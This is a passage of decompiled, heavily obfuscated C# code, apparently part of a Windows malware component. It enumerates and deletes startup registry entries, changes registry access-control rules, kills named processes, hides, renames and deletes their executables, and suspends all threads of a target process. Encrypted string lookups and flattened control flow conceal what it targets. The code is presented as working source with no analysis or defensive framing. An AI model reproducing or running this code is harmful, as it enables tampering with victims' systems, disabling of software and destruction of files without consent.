						num18 += _003CModule_003E.sFziFOmofPAHMrejeaheMvcjwDhT<int>(1765197669u);
						num17 = -380422526;
						continue;
					case 7u:
						SAjxBDBlhHvJgKDXdLUOciIFPCOx += _003CModule_003E.RjBjcaRpVQRQjduKhEhCRNnWcGZA<int>(703764269u);
						num17 = ((int)num3 * -2112297862) ^ 0x733A1345;
						continue;
					case 5u:
						num17 = (int)(num3 * 310212111) ^ -1423700938;
						continue;
					case 4u:
					{
						int num22;
						int num23;
						if (mRGXJIyJfLzOpZoUucBPJErJOvpQA.ATcRXbEwqymIbvFFGBmGKeSZwBCE(text3, PFcXsEKWombhNSyYwIBjkqKLZnad.JuLmHBSMNchgPkOYDzuCqunaTDHsA))
						{
							num22 = 1425403528;
							num23 = 1425403528;
						}
						else
						{
							num22 = -1301117148;
							num23 = -1301117148;
						}
						num17 = num22 ^ (int)(num3 * 1276851623);
						continue;
					}
					case 3u:
					{
						int num19;
						int num20;
						if (mRGXJIyJfLzOpZoUucBPJErJOvpQA.SHwQtoulbMdHDrgOikXJMDxoYbMt(mRGXJIyJfLzOpZoUucBPJErJOvpQA.GDqNNeEKixrLRgmISVJqLmVHXVmB(mRGXJIyJfLzOpZoUucBPJErJOvpQA.nsIintFHzsBqLffNjneczeJnvjnZ(registryKey_3, text3)), string_1))
						{
							num19 = 27323838;
							num20 = 27323838;
						}
						else
						{
							num19 = 900220408;
							num20 = 900220408;
						}
						num17 = num19 ^ (int)(num3 * 680205173);
						continue;
					}
					case 2u:
						array3 = mRGXJIyJfLzOpZoUucBPJErJOvpQA.bVNeqCCOEpNeroszRSzzYKIXVBuS(registryKey_3);
						num18 = _003CModule_003E.MDOVZwJkbqafjMRifLnnfnKSxfOy<int>(2296003411u);
						num17 = (int)((num3 * 1293987569) ^ 0x9EE82FA);
						continue;
					case 1u:
						text3 = array3[num18];
						num17 = 844019931;
						continue;
					case 0u:
						KxIfVVBNIYycKaiyjxPulyArCsuBA(_003CModule_003E.IqDeOffJAyhLfPMKjPibRdyWexel<string>(4217128316u), _003CModule_003E.LgFoxgBqIeDqHwMbUrJzdDbPduER<string>(791612312u), text3);
						num17 = (int)((num3 * 1292637617) ^ 0x62A8F5E2);
						continue;
					default:
						goto end_IL_04a0;
					case 6u:
						break;
					case 9u:
						goto end_IL_04a0;
					}
					goto IL_04f1;
					continue;
					end_IL_04a0:
					break;
				}
				break;
			}
		}
		catch
		{
		}
		try
		{
			RegistryKey registryKey_4 = mRGXJIyJfLzOpZoUucBPJErJOvpQA.bhcvVIuKKmcdHKhaBrHAHapvxsPYA(Registry.LocalMachine, _003CModule_003E.sijOsyDrdtOknZIEEMNATWpRYcmI<string>(2982488719u));
			string[] array4 = mRGXJIyJfLzOpZoUucBPJErJOvpQA.bVNeqCCOEpNeroszRSzzYKIXVBuS(registryKey_4);
			int num24 = _003CModule_003E.blHaVlzmYUQQBLkBKXidagrTAbG<int>(602017866u);
			string text4 = default(string);
			while (true)
			{
				int num25;
				int num26;
				if (num24 >= array4.Length)
				{
					num25 = -106979733;
					num26 = -106979733;
				}
				else
				{
					num25 = -692212834;
					num26 = -692212834;
				}
				while (true)
				{
					int num2 = num25;
					uint num3;
					switch ((num3 = (uint)(-(~(num2 + 1054728733) ^ 0x69B2FF20 ^ 0x25F2711A))) % 8u)
					{
					case 6u:
						KxIfVVBNIYycKaiyjxPulyArCsuBA(_003CModule_003E.MDOVZwJkbqafjMRifLnnfnKSxfOy<string>(1793824467u), _003CModule_003E.sFziFOmofPAHMrejeaheMvcjwDhT<string>(4117424710u), text4);
						SAjxBDBlhHvJgKDXdLUOciIFPCOx += _003CModule_003E.blHaVlzmYUQQBLkBKXidagrTAbG<int>(952616933u);
						num25 = (int)((num3 * 1614593742) ^ 0x2FEA32C0);
						continue;
					case 5u:
					{
						int num29;
						int num30;
						if (mRGXJIyJfLzOpZoUucBPJErJOvpQA.SHwQtoulbMdHDrgOikXJMDxoYbMt(mRGXJIyJfLzOpZoUucBPJErJOvpQA.GDqNNeEKixrLRgmISVJqLmVHXVmB(mRGXJIyJfLzOpZoUucBPJErJOvpQA.nsIintFHzsBqLffNjneczeJnvjnZ(registryKey_4, text4)), string_1))
						{
							num29 = -501526427;
							num30 = -501526427;
						}
						else
						{
							num29 = 483750964;
							num30 = 483750964;
						}
						num25 = num29 ^ ((int)num3 * -1331249088);
						continue;
					}
					case 4u:
						num24 += _003CModule_003E.oQGcPizWpTmKJWhqplvYaKxHcQrO<int>(3636103151u);
						num25 = 104376367;
						continue;
					case 2u:
						text4 = array4[num24];
						num25 = 626518297;
						continue;
					case 1u:
					{
						int num27;
						int num28;
						if (mRGXJIyJfLzOpZoUucBPJErJOvpQA.ATcRXbEwqymIbvFFGBmGKeSZwBCE(text4, PFcXsEKWombhNSyYwIBjkqKLZnad.JuLmHBSMNchgPkOYDzuCqunaTDHsA))
						{
							num27 = -1354666140;
							num28 = -1354666140;
						}
						else
						{
							num27 = 1251484674;
							num28 = 1251484674;
						}
						num25 = num27 ^ (int)(num3 * 323820454);
						continue;
					}
					case 0u:
						num25 = -692212834;
						continue;
					default:
						return;
					case 7u:
						break;
					case 3u:
						return;
					}
					break;
				}
			}
		}
		catch
		{
		}
	}

	public static void rsvKtfyCWJTgvwlGijVJvorCyQSE()
	{
		try
		{
			SecurityIdentifier identityReference_ = mRGXJIyJfLzOpZoUucBPJErJOvpQA.oIuACFgjJhFQSUphBVjJoMQDgMbgA((WellKnownSidType)_003CModule_003E.ZsXsNDGRbbBjKpBZHQikiDznkQrc<int>(1714240447u), (SecurityIdentifier)null);
			NTAccount object_ = default(NTAccount);
			while (true)
			{
				int num = -1821688911;
				while (true)
				{
					int num2 = num;
					uint num3;
					switch ((num3 = (uint)(-(~(~num2) - -1689737832)) ^ 0x1E3EA90Cu) % 3u)
					{
					case 1u:
						goto IL_0013;
					case 2u:
						break;
					default:
					{
						RegistryKey registryKey = mRGXJIyJfLzOpZoUucBPJErJOvpQA.ZwJVlIChvjAlbSnCwQaTqVqCfvtu(Registry.CurrentUser, _003CModule_003E.oQGcPizWpTmKJWhqplvYaKxHcQrO<string>(1408146313u), (byte)_003CModule_003E.sijOsyDrdtOknZIEEMNATWpRYcmI<int>(1683131574u) != 0);
						try
						{
							RegistrySecurity registrySecurity_ = mRGXJIyJfLzOpZoUucBPJErJOvpQA.rjEvEoAbOQSJmeoVNdMQKdskCNcDb(registryKey);
							while (true)
							{
								int num4 = 1838961975;
								while (true)
								{
									num2 = num4;
									switch ((num3 = (uint)(-(~(~num2) - -1689737832)) ^ 0x1E3EA90Cu) % 4u)
									{
									case 1u:
									{
										RegistryAccessRule registryAccessRule_ = mRGXJIyJfLzOpZoUucBPJErJOvpQA.kxbHnwmLdoeereUvIXQVagEuIIYd(mRGXJIyJfLzOpZoUucBPJErJOvpQA.GDqNNeEKixrLRgmISVJqLmVHXVmB((object)object_), (RegistryRights)_003CModule_003E.RjBjcaRpVQRQjduKhEhCRNnWcGZA<int>(175263321u), (InheritanceFlags)_003CModule_003E.blHaVlzmYUQQBLkBKXidagrTAbG<int>(2793390760u), (PropagationFlags)_003CModule_003E.ZsXsNDGRbbBjKpBZHQikiDznkQrc<int>(3818606444u), (AccessControlType)_003CModule_003E.sFziFOmofPAHMrejeaheMvcjwDhT<int>(1765197669u));
										mRGXJIyJfLzOpZoUucBPJErJOvpQA.lOheVHLpZDdZmKVyluZCQGSaHIIj(registrySecurity_, registryAccessRule_);
										num4 = (int)(num3 * 1055936489) ^ -1607183439;
										continue;
									}
									case 0u:
										mRGXJIyJfLzOpZoUucBPJErJOvpQA.encTbNccOqvoBOxHBmckagRKhuEL(registryKey, registrySecurity_);
										num4 = ((int)num3 * -1936551338) ^ -843483286;
										continue;
									default:
										return;
									case 3u:
										break;
									case 2u:
										return;
									}
									break;
								}
							}
						}
						finally
						{
							if (registryKey != null)
							{
								while (true)
								{
									IL_0172:
									int num5 = 845775275;
									while (true)
									{
										num2 = num5;
										switch ((num3 = (uint)(-(~(~num2) - -1689737832)) ^ 0x1E3EA90Cu) % 3u)
										{
										case 1u:
											goto IL_0133;
										default:
											goto end_IL_0147;
										case 2u:
											break;
										case 0u:
											goto end_IL_0147;
										}
										goto IL_0172;
										IL_0133:
										mRGXJIyJfLzOpZoUucBPJErJOvpQA.kbcdDPNjmEyXDGArpaMlPVSsDkNJ((IDisposable)registryKey);
										num5 = (int)((num3 * 1329040631) ^ 0x212F9E23);
										continue;
										end_IL_0147:
										break;
									}
									break;
								}
							}
						}
					}
					}
					break;
					IL_0013:
					object_ = mRGXJIyJfLzOpZoUucBPJErJOvpQA.UnkMdlAhjXtelFKCwCDrGcGOQDkHA((IdentityReference)identityReference_, mRGXJIyJfLzOpZoUucBPJErJOvpQA.udoRPvNeERhljxaJpHzFaDQMNRnH(typeof(NTAccount).TypeHandle)) as NTAccount;
					num = (int)((num3 * 923540645) ^ 0x6DFBC1C9);
				}
			}
		}
		catch
		{
		}
	}

	public static void KxIfVVBNIYycKaiyjxPulyArCsuBA(string string_0, string string_1, string string_2)
	{
		try
		{
			RegistryKey registryKey = default(RegistryKey);
			while (true)
			{
				int num = 1527148780;
				while (true)
				{
					int num2 = num;
					uint num3;
					switch ((num3 = (uint)(1359502746 - -(~((num2 ^ -1241962578) * 1675233231)))) % 5u)
					{
					case 4u:
					{
						registryKey = null;
						int num6;
						int num7;
						if (!mRGXJIyJfLzOpZoUucBPJErJOvpQA.priBrMpjniNsIUkQaxVveGTxhNu(string_0, _003CModule_003E.hJQECUaiOdzqVTCrmwbGWmxnKMpg<string>(3773685099u)))
						{
							num6 = 1975317773;
							num7 = 1975317773;
						}
						else
						{
							num6 = 195790459;
							num7 = 195790459;
						}
						num = num6 ^ (int)(num3 * 1991574109);
						continue;
					}
					case 3u:
						registryKey = mRGXJIyJfLzOpZoUucBPJErJOvpQA.ZwJVlIChvjAlbSnCwQaTqVqCfvtu(Registry.LocalMachine, string_1, (byte)_003CModule_003E.hJQECUaiOdzqVTCrmwbGWmxnKMpg<int>(540286180u) != 0);
						num = 1390141946;
						continue;
					case 2u:
						registryKey = mRGXJIyJfLzOpZoUucBPJErJOvpQA.ZwJVlIChvjAlbSnCwQaTqVqCfvtu(Registry.CurrentUser, string_1, (byte)_003CModule_003E.IqDeOffJAyhLfPMKjPibRdyWexel<int>(1350249239u) != 0);
						num = ((int)num3 * -272592674) ^ -1077040704;
						continue;
					case 0u:
						break;
					default:
					{
						RegistryKey registryKey2 = registryKey;
						try
						{
							if (registryKey == null)
							{
								return;
							}
							while (true)
							{
								int num4 = 2043485694;
								while (true)
								{
									num2 = num4;
									switch ((num3 = (uint)(1359502746 - -(~((num2 ^ -1241962578) * 1675233231)))) % 3u)
									{
									case 2u:
										goto IL_00c1;
									default:
										return;
									case 0u:
										break;
									case 1u:
										return;
									}
									break;
									IL_00c1:
									mRGXJIyJfLzOpZoUucBPJErJOvpQA.FgBXrxGprzkHzQLTXfsnIhQKtesUA(registryKey, string_2);
									num4 = ((int)num3 * -1199590816) ^ 0x3481B4DC;
								}
							}
						}
						finally
						{
							if (registryKey2 != null)
							{
								while (true)
								{
									IL_0154:
									int num5 = 528103762;
									while (true)
									{
										num2 = num5;
										switch ((num3 = (uint)(1359502746 - -(~((num2 ^ -1241962578) * 1675233231)))) % 3u)
										{
										case 1u:
											goto IL_0112;
										default:
											goto end_IL_0125;
										case 2u:
											break;
										case 0u:
											goto end_IL_0125;
										}
										goto IL_0154;
										IL_0112:
										mRGXJIyJfLzOpZoUucBPJErJOvpQA.kbcdDPNjmEyXDGArpaMlPVSsDkNJ((IDisposable)registryKey2);
										num5 = (int)(num3 * 637245586) ^ -711975640;
										continue;
										end_IL_0125:
										break;
									}
									break;
								}
							}
						}
					}
					}
					break;
				}
			}
		}
		catch
		{
		}
	}

	public static void ytSfQjALHixrrtpisHQMqamXUAeB(string string_0, string string_1, int int_0)
	{
		Process[] array = mRGXJIyJfLzOpZoUucBPJErJOvpQA.DumdPYOlZTNOxnljXgWmChRoRWZF(string_0);
		int num4 = default(int);
		Random random_ = default(Random);
		while (true)
		{
			int num = 43966418;
			while (true)
			{
				int num2 = num;
				int num5;
				uint num3;
				switch ((num3 = (uint)(-(~(-num2 ^ -637123437) * -1838736501))) % 4u)
				{
				case 2u:
					goto IL_0009;
				case 3u:
					break;
				case 1u:
					if (num4 >= array.Length)
					{
						num5 = -1956533122;
						goto IL_01c6;
					}
					goto default;
				default:
					{
						Process process_ = array[num4];
						try
						{
							mRGXJIyJfLzOpZoUucBPJErJOvpQA.NdipuYTCXgBSdKdraTYOLjdOguhiA(process_);
							while (true)
							{
								IL_00b0:
								int num6 = 1658056954;
								while (true)
								{
									num2 = num6;
									switch ((num3 = (uint)(-(~(-num2 ^ -637123437) * -1838736501))) % 3u)
									{
									case 2u:
										goto IL_0071;
									case 0u:
										break;
									default:
										mRGXJIyJfLzOpZoUucBPJErJOvpQA.hzMAPleMkuFhlQCkIJstfgBjkwBSB(string_1, (FileAttributes)_003CModule_003E.bRSGmsGWNJcmJIpCFajFxuwXmAZh<int>(1041530507u));
										try
										{
											File.Move(string_1, mRGXJIyJfLzOpZoUucBPJErJOvpQA.PpHAYrXzBZWrhYRcCcrQahhNYuIB(_003CModule_003E.bRSGmsGWNJcmJIpCFajFxuwXmAZh<string>(1416672145u)) + _003CModule_003E.RglfOnXgouCNqcZfJkUzZiRYPeNm<string>(3250951399u) + mRGXJIyJfLzOpZoUucBPJErJOvpQA.dcTvFFJIlKwEyzFAOofrGIgbRCLj(random_, _003CModule_003E.hJQECUaiOdzqVTCrmwbGWmxnKMpg<int>(1509213571u), _003CModule_003E.IqDeOffJAyhLfPMKjPibRdyWexel<int>(662044019u)));
											while (true)
											{
												IL_0179:
												int num7 = -2054873353;
												while (true)
												{
													num2 = num7;
													switch ((num3 = (uint)(-(~(-num2 ^ -637123437) * -1838736501))) % 4u)
													{
													case 2u:
														AXtwWtZknlRMIHXRIIoDsOokxrUC(string_1);
														File.Delete(string_1);
														num7 = (int)((num3 * 1036140410) ^ 0x6BFE0624);
														continue;
													case 1u:
														File.WriteAllText(string_1, _003CModule_003E.ZsXsNDGRbbBjKpBZHQikiDznkQrc<string>(1148388392u));
														num7 = ((int)num3 * -783206431) ^ -1413054489;
														continue;
													default:
														goto end_IL_014a;
													case 3u:
														break;
													case 0u:
														goto end_IL_014a;
													}
													goto IL_0179;
													continue;
													end_IL_014a:
													break;
												}
												break;
											}
										}
										catch
										{
										}
										TOmxQTadNeyqFfQSzdgZQtIsDQHZ += _003CModule_003E.IqDeOffJAyhLfPMKjPibRdyWexel<int>(1350249239u);
										FSymfBAMHwKXjxTacKfsYdKfLTZG += _003CModule_003E.IqDeOffJAyhLfPMKjPibRdyWexel<int>(1350249239u);
										goto end_IL_0085;
									}
									goto IL_00b0;
									IL_0071:
									random_ = mRGXJIyJfLzOpZoUucBPJErJOvpQA.GKlKIWNXXdIeSEklEvewBsghjKcG();
									num6 = (int)((num3 * 1530475601) ^ 0x679AB615);
									continue;
									end_IL_0085:
									break;
								}
								break;
							}
						}
						catch
						{
						}
						num4 += _003CModule_003E.bRSGmsGWNJcmJIpCFajFxuwXmAZh<int>(1111118186u);
						goto IL_01c1;
					}
					IL_01c1:
					num5 = -480184482;
					goto IL_01c6;
					IL_01c6:
					num2 = num5;
					switch ((num3 = (uint)(-(~(-num2 ^ -637123437) * -1838736501))) % 3u)
					{
					case 1u:
						break;
					case 0u:
						goto IL_01c1;
					default:
						return;
					case 2u:
						return;
					}
					goto case 1u;
				}
				break;
				IL_0009:
				num4 = _003CModule_003E.blHaVlzmYUQQBLkBKXidagrTAbG<int>(602017866u);
				num = ((int)num3 * -1530087102) ^ 0x2CDE9003;
			}
		}
	}

	public static void MXfFjngUTwpCTzYwAZualEwTWqms(int int_0)
	{
		try
		{
			Process process = mRGXJIyJfLzOpZoUucBPJErJOvpQA.YSYrhBnfxItIkLPCbCcXrJHyiWZF(int_0);
			try
			{
				if (mRGXJIyJfLzOpZoUucBPJErJOvpQA.priBrMpjniNsIUkQaxVveGTxhNu(mRGXJIyJfLzOpZoUucBPJErJOvpQA.EhJaisjaZVTRSdXMEAouPhzHnPjW(process), string.Empty))
				{
					int num = 193283451;
					uint num2 = 1056926899u;
					return;
				}
				IEnumerator enumerator = mRGXJIyJfLzOpZoUucBPJErJOvpQA.RlmfvweiwYlihOnSrrxLLpxhhUHGA((ReadOnlyCollectionBase)mRGXJIyJfLzOpZoUucBPJErJOvpQA.UATeGoPHsNtQcqgzuEboDsVVSptt(process));
				try
				{
					IntPtr intPtr = default(IntPtr);
					while (true)
					{
						int num3;
						int num4;
						if (!mRGXJIyJfLzOpZoUucBPJErJOvpQA.tVcJKkjmGbIhvGXlpaBePmJZyOpP(enumerator))
						{
							num3 = 1185254669;
							num4 = 1185254669;
						}
						else
						{
							num3 = -116202698;
							num4 = -116202698;
						}
						while (true)
						{
							int num = num3;
							uint num2;
							switch ((num2 = (uint)(-1833321629 - (num - 800921363 - -2012356680))) % 5u)
							{
							case 3u:
							{
								ProcessThread processThread_ = (ProcessThread)mRGXJIyJfLzOpZoUucBPJErJOvpQA.pnCGoIsCFEYkPRBJpLexTjSZvgNL(enumerator);
								intPtr = HToMqbkqEFirscJTxkkBlQTYzEPG.OpenThread((HToMqbkqEFirscJTxkkBlQTYzEPG.MUogwsEgmgMXAnprDcdMBiaQTBqq)_003CModule_003E.LgFoxgBqIeDqHwMbUrJzdDbPduER<int>(804979259u), (byte)_003CModule_003E.LgFoxgBqIeDqHwMbUrJzdDbPduER<int>(1911823690u) != 0, (uint)mRGXJIyJfLzOpZoUucBPJErJOvpQA.WkQVqNtlqJdYBBaJHJIvTyqSXetN(processThread_));
								int num5;
								if (!(intPtr == IntPtr.Zero))
								{
									num3 = 38569690;
									num5 = 38569690;
								}
								else
								{
									num3 = 1185254669;
									num5 = 1185254669;
								}
								continue;
							}
							case 2u:
								num3 = -116202698;
								continue;
							case 0u:
								HToMqbkqEFirscJTxkkBlQTYzEPG.SuspendThread(intPtr);
								num3 = ((int)num2 * -642010703) ^ -1770311129;
								continue;
							default:
								return;
							case 4u:
								break;
							case 1u:
								return;
							}
							break;
						}
					}
				}
				finally
				{
					if (enumerator is IDisposable idisposable_)
					{
						while (true)
						{
							IL_015e:
							int num6 = -399404251;
							while (true)
							{
								int num = num6;
								uint num2;
								switch ((num2 = (uint)(-1833321629 - (num - 800921363 - -2012356680))) % 3u)
								{
								case 2u:
									goto IL_011b;
								default:
									goto end_IL_0130;
								case 0u:
									break;
								case 1u:
									goto end_IL_0130;
								}
								goto IL_015e;
								IL_011b:
								mRGXJIyJfLzOpZoUucBPJErJOvpQA.kbcdDPNjmEyXDGArpaMlPVSsDkNJ(idisposable_);
								num6 = ((int)num2 * -422169262) ^ -1855433539;
								continue;
								end_IL_0130:
								break;
							}
							break;
						}
					}
				}
			}
			finally
			{
				if (process != null)
				{
					while (true)
					{
						IL_01af:
						int num7 = -698196180;
						while (true)
						{
							int num = num7;
							uint num2;
							switch ((num2 = (uint)(-1833321629 - (num - 800921363 - -2012356680))) % 3u)
							{
							case 1u:
								goto IL_016d;
							default:
								goto end_IL_0181;
							case 0u:
								break;
							case 2u:
								goto end_IL_0181;
							}
							goto IL_01af;
							IL_016d:
							mRGXJIyJfLzOpZoUucBPJErJOvpQA.kbcdDPNjmEyXDGArpaMlPVSsDkNJ((IDisposable)process);
							num7 = ((int)num2 * -84629027) ^ -1001571492;
							continue;
							end_IL_0181:
							break;
						}
						break;
					}
				}
			}
		}
		catch
		{
		}
	}

	[CompilerGenerated]
	private static void iBdosrlIlOKuGbTuEPjAnkBaAOyS()
	{
		while (true)
		{
			if (!mRGXJIyJfLzOpZoUucBPJErJOvpQA.priBrMpjniNsIUkQaxVveGTxhNu(GpuDNKzAIXCxgEhIGOCFaCjGqitTB.QUGKShsngkmFbeawTxGpAlGJtgkg, _003CModule_003E.bRSGmsGWNJcmJIpCFajFxuwXmAZh<string>(883403100u)))
			{
				goto IL_002c;
			}
			goto IL_0060;
			IL_0060:
			mRGXJIyJfLzOpZoUucBPJErJOvpQA.rrYZfaJJCVIMPMbDAeJSeIlBhKFfb(_003CModule_003E.vCgetZRAfwOfXDFjqBKEQPxCexnFA<int>(2811553908u));
			int num = 1322325947;
			goto IL_0031;
			IL_0031:
			while (true)
			{
				int num2 = num;
				uint num3;
				switch ((num3 = (uint)(num2 * -1561431315 * -230933855 - 27328174)) % 4u)
				{
				case 3u:
					PFcXsEKWombhNSyYwIBjkqKLZnad.WBnBogxnBFPPzeJAAsMSqiJBABMhA();
					num = (int)(num3 * 46421160) ^ -501035990;
					continue;
				case 2u:
					goto IL_002c;
				case 0u:
					goto IL_0060;
				}
				break;
			}
			continue;
			IL_002c:
			num = -950484355;
			goto IL_0031;
		}
	}

	static Thread WsclJKVvaIhCWJeVoNxiLlIHtYJR(ThreadStart threadStart_0)
	{
		return new Thread(threadStart_0);
	}

	static void geEQAiwUiMenUuFPfmMpeRKqBEpI(Thread thread_0, bool bool_0)
	{
		thread_0.IsBackground = bool_0;
	}

	static void GmmBanGxoEmzrHQWYwBpNvfYGHKs(Thread thread_0)
	{
		thread_0.Start();
	}

	static Process[] qgtzORtPHcHLheUBslcqSmSwUrbeA()
	{
		return Process.GetProcesses();
	}

	static ProcessModule nRolUkbsWQiHHCUcjCjqIXCGGDct(Process process_0)
	{
		return process_0.MainModule;
	}

	static string TgHkaWKdAziFtFcMsJJzibLyyuwc(ProcessModule processModule_0)
	{
		return processModule_0.FileName;
	}

	static string PpHAYrXzBZWrhYRcCcrQahhNYuIB(string string_0)
	{
		return Environment.GetEnvironmentVariable(string_0);
	}

	static bool SHwQtoulbMdHDrgOikXJMDxoYbMt(string string_0, string string_1)
	{
		return string_0.Contains(string_1);
	}

	static string EhJaisjaZVTRSdXMEAouPhzHnPjW(Process process_0)
	{
		return process_0.ProcessName;
	}

	static Process uJPaeIynHmgSLDmlNNnzRyRyhXCF()
	{
		return Process.GetCurrentProcess();
	}

	static bool ATcRXbEwqymIbvFFGBmGKeSZwBCE(string string_0, string string_1)
	{
		return string_0 != string_1;
	}

	static IntPtr suQqkjJLgOygcAenoCmrDBYMahMA(Process process_0)
	{
		return process_0.MainWindowHandle;
	}

	static int SQEnKHJDRzGXxtseKDNuDZOwePms(Process process_0)
	{
		return process_0.Id;
	}

	static string rwzsYBQyOGpiJAgtNRvMWaLHlaHm()
	{
		return Environment.UserName;
	}

	static string GDqNNeEKixrLRgmISVJqLmVHXVmB(object object_0)
	{
		return object_0.ToString();
	}

	static DirectoryInfo DoclIrGmjAYUDWHzLSIJHdRCirIF(string string_0)
	{
		return new DirectoryInfo(string_0);
	}

	static DirectorySecurity LzxiElwXNyFSXHQpVKHEZfwaCYyv()
	{
		return new DirectorySecurity();
	}

	static FileSystemAccessRule xnlwXwpCunGfPgEkRZCfwBjioAoX(string string_0, FileSystemRights fileSystemRights_0, InheritanceFlags inheritanceFlags_0, PropagationFlags propagationFlags_0, AccessControlType accessControlType_0)
	{
		return new FileSystemAccessRule(string_0, fileSystemRights_0, inheritanceFlags_0, propagationFlags_0, accessControlType_0);
	}

	static void RkFncqgeNlTcAsuorDKdfBVYOUZM(FileSystemSecurity fileSystemSecurity_0, FileSystemAccessRule fileSystemAccessRule_0)
	{
		fileSystemSecurity_0.AddAccessRule(fileSystemAccessRule_0);
	}

	static void JkWZYSzbEdFlkWdDAqYJfPYQvwNA(ObjectSecurity objectSecurity_0, bool bool_0, bool bool_1)
	{
		objectSecurity_0.SetAccessRuleProtection(bool_0, bool_1);
	}

	static void duQvqaQxxNHMQoJHsXTSyQhBJiYG(DirectoryInfo directoryInfo_0, DirectorySecurity directorySecurity_0)
	{
		directoryInfo_0.SetAccessControl(directorySecurity_0);
	}

	static RegistryKey bhcvVIuKKmcdHKhaBrHAHapvxsPYA(RegistryKey registryKey_0, string string_0)
	{
		return registryKey_0.OpenSubKey(string_0);
	}

	static string[] bVNeqCCOEpNeroszRSzzYKIXVBuS(RegistryKey registryKey_0)
	{
		return registryKey_0.GetValueNames();
	}

	static object nsIintFHzsBqLffNjneczeJnvjnZ(RegistryKey registryKey_0, string string_0)
	{
		return registryKey_0.GetValue(string_0);
	}

	static SecurityIdentifier oIuACFgjJhFQSUphBVjJoMQDgMbgA(WellKnownSidType wellKnownSidType_0, SecurityIdentifier securityIdentifier_0)
	{
		return new SecurityIdentifier(wellKnownSidType_0, securityIdentifier_0);
	}

	static Type udoRPvNeERhljxaJpHzFaDQMNRnH(RuntimeTypeHandle runtimeTypeHandle_0)
	{
		return Type.GetTypeFromHandle(runtimeTypeHandle_0);
	}

	static IdentityReference UnkMdlAhjXtelFKCwCDrGcGOQDkHA(IdentityReference identityReference_0, Type type_0)
	{
		return identityReference_0.Translate(type_0);
	}

	static RegistryKey ZwJVlIChvjAlbSnCwQaTqVqCfvtu(RegistryKey registryKey_0, string string_0, bool bool_0)
	{
		return registryKey_0.OpenSubKey(string_0, bool_0);
	}

	static RegistrySecurity rjEvEoAbOQSJmeoVNdMQKdskCNcDb(RegistryKey registryKey_0)
	{
		return registryKey_0.GetAccessControl();
	}

	static RegistryAccessRule kxbHnwmLdoeereUvIXQVagEuIIYd(string string_0, RegistryRights registryRights_0, InheritanceFlags inheritanceFlags_0, PropagationFlags propagationFlags_0, AccessControlType accessControlType_0)
	{
		return new RegistryAccessRule(string_0, registryRights_0, inheritanceFlags_0, propagationFlags_0, accessControlType_0);
	}

	static void lOheVHLpZDdZmKVyluZCQGSaHIIj(RegistrySecurity registrySecurity_0, RegistryAccessRule registryAccessRule_0)
	{
		registrySecurity_0.AddAccessRule(registryAccessRule_0);
	}

	static void encTbNccOqvoBOxHBmckagRKhuEL(RegistryKey registryKey_0, RegistrySecurity registrySecurity_0)
	{
		registryKey_0.SetAccessControl(registrySecurity_0);
	}

	static void kbcdDPNjmEyXDGArpaMlPVSsDkNJ(IDisposable idisposable_0)
	{
		idisposable_0.Dispose();
	}

	static bool priBrMpjniNsIUkQaxVveGTxhNu(string string_0, string string_1)
	{
		return string_0 == string_1;
	}

	static void FgBXrxGprzkHzQLTXfsnIhQKtesUA(RegistryKey registryKey_0, string string_0)
	{
		registryKey_0.DeleteValue(string_0);
	}

	static Process[] DumdPYOlZTNOxnljXgWmChRoRWZF(string string_0)
	{
		return Process.GetProcessesByName(string_0);
	}

	static void NdipuYTCXgBSdKdraTYOLjdOguhiA(Process process_0)
	{
		process_0.Kill();
	}

	static Random GKlKIWNXXdIeSEklEvewBsghjKcG()
	{
		return new Random();
	}

	static void hzMAPleMkuFhlQCkIJstfgBjkwBSB(string string_0, FileAttributes fileAttributes_0)
	{
		File.SetAttributes(string_0, fileAttributes_0);
	}

	static int dcTvFFJIlKwEyzFAOofrGIgbRCLj(Random random_0, int int_0, int int_1)
	{
		return random_0.Next(int_0, int_1);
	}

	static Process YSYrhBnfxItIkLPCbCcXrJHyiWZF(int int_0)
	{
		return Process.GetProcessById(int_0);
	}

	static ProcessThreadCollection UATeGoPHsNtQcqgzuEboDsVVSptt(Process process_0)
	{
		return process_0.Threads;
	}

	static IEnumerator RlmfvweiwYlihOnSrrxLLpxhhUHGA(ReadOnlyCollectionBase readOnlyCollectionBase_0)
	{
		return readOnlyCollectionBase_0.GetEnumerator();
	}

	static object pnCGoIsCFEYkPRBJpLexTjSZvgNL(IEnumerator ienumerator_0)
	{
		return ienumerator_0.Current;
	}

	static int WkQVqNtlqJdYBBaJHJIvTyqSXetN(ProcessThread processThread_0)
	{
		return processThread_0.Id;
	}

	static bool tVcJKkjmGbIhvGXlpaBePmJZyOpP(IEnumerator ienumerator_0)
	{
		return ienumerator_0.MoveNext();
	}

	static void rrYZfaJJCVIMPMbDAeJSeIlBhKFfb(int int_0)
	{
		Thread.Sleep(int_0);
	}
}
